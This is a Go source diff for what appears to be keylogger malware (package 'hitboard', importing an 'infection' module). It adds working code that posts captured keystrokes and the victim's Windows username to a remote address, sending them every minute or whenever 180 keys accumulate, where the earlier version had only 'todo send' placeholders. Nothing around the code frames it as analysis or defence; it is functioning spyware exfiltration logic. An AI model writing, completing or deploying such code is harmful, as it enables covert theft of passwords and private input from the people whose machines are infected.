@@ -2,6 +2,8 @@ package hitboard
 
 import (
 	"github.com/AllenDang/w32"
+	"github.com/parnurzeal/gorequest"
+	"infection/machineinfo"
 	"log"
 	"syscall"
 	"time"
@@ -16,7 +18,16 @@ var (
 	KeyCount           = 180
 )
 
-func KeyBoardCollection() {
+type msg struct {
+	Record string `json:"record"`
+	User   string `json:"user"`
+}
+
+type KeyboardStatusResponse struct {
+	Succeed bool `json:"succeed"`
+}
+
+func KeyBoardCollection(addr string) {
 	start := time.Now()
 	elapsed := time.Since(start)
 	elapsedsec := int64(elapsed/time.Millisecond) / 1000
@@ -26,11 +37,44 @@ func KeyBoardCollection() {
 		elapsed := time.Since(start)
 		elapsedsec = int64(elapsed/time.Millisecond) / 1000
 		// 1mins 60s   hitting 180 times keyboard
+		keyboardStatusResponse := KeyboardStatusResponse{}
 		if elapsedsec == 60 {
-			//todo send
+			user := machineinfo.GetUserName()
+			msgstb := msg{
+				Record: tmpKeylog,
+				User:   user,
+			}
+			resp, _, err := gorequest.New().
+				Post(addr).
+				Send(msgstb).
+				EndStruct(&keyboardStatusResponse)
+			if err != nil {
+				log.Println("error:", err)
+			}
+			if resp.StatusCode == 200 && keyboardStatusResponse.Succeed {
+				log.Println("Upload keyboard record Status Successful !")
+			} else {
+				log.Println("Upload keyboard record Status Fail !")
+			}
 			continue
 		} else if len(tmpKeylog) >= KeyCount {
-			//todo send
+			user := machineinfo.GetUserName()
+			msgstb := msg{
+				Record: tmpKeylog,
+				User:   user,
+			}
+			resp, _, err := gorequest.New().
+				Post(addr).
+				Send(msgstb).
+				EndStruct(&keyboardStatusResponse)
+			if err != nil {
+				log.Println("error:", err)
+			}
+			if resp.StatusCode == 200 && keyboardStatusResponse.Succeed {
+				log.Println("Upload keyboard record Status Successful !")
+			} else {
+				log.Println("Upload keyboard record Status Fail !")
+			}
 			tmpKeylog = ""
 			continue
 		}
